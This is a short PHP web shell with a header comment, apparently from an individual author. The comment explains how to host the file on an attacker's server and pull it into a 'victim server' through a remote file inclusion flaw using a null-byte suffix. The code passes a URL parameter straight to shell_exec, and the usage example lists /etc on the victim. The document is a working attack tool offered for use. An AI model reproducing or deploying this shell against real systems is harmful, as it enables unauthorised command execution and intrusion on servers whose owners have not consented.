<!-- 
 A simple PHP web shell that will execute commands via URL string. 
 This script should be hosted on your own server via http, then called
 from the victim server via RFI exploit that you have discovered. This 
 is useful when other common PHP execution functions are blocked for
 whatever reason.

 Usage: https://victim-ip/section.php?page=http://your-ip/shellex.php%00&e=ls -al /etc

	By Will Chatham. @willc on most things.

-->	

<pre>
<?php echo shell_exec($_GET['e']); ?>
</pre>
